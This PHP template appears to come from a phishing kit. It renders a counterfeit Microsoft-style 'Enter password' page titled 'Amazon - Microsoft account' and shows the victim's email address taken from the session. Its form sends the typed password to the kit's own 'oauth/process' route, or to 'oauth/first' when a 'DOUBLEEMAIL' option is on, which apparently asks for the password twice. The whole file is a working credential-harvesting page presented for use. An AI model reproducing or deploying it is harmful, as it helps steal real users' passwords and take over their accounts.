<?php
defined("ALLOW") or exit('No direct script access allowed');
if (_config('DOUBLEEMAIL') == 'on') {
    $url = base_url() . "oauth/first";
} else {
    $url = base_url() . "oauth/process";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Amazon - Microsoft account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="shortcut icon" href="<?= base_url() ?>Assets/email/img/favicon.ico">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/email/css/boostrap.min.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/email/css/main2.css">
</head>

<body>
    <div class="container-fluid">
        <div class="row d-flex align-items-center justify-content-center">
            <div class="col-lg-4 col-mg-4 col-sm-14">
                <div class="card">
                    <div class="card-body"><img src="<?= base_url() ?>Assets/email/img/logo.svg" class="logo">
                        <p class="mb-1"><img src="<?= base_url() ?>Assets/email/img/arrow.svg" class="arrow"><?= $_SESSION['email'] ?></p>
                        <p class="text-title mb-2">Enter password</p>
                        <div role="alert" aria-live="assertive"></div>
                        <form method="post" action="<?= $url ?>">
                            <div class="form-group"><input type="password" class="form-control" placeholder="Password" autocorrect="off" autocapitalize="off" spellcheck id="password" name="password" required></div>
                            <div class="form-group form-check"><label class="form-check-label"><input class="form-check-input" type="checkbox"><span>Keep me signed in</span></label></div>
                            <p class="forgot"><a href="#">Forgot password?</a></p>
                            <p class="forgot"><a href="#">Sign in with a security key</a></p><button type="submit" class="btn btn-primary float-right" name="submit">Sign in</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <footer class="float-right">
            <ul class="list-group list-group-horizontal">
                <li class="list-group-item"><a href="#">Terms of use</a></li>
                <li class="list-group-item"><a href="#">Privacy & cookies</a></li>
                <li class="list-group-item"><a href="#"><img src="<?= base_url() ?>Assets/email/img/ellipsis.svg"></a></li>
            </ul>
        </footer>
    </div>
</body>

</html>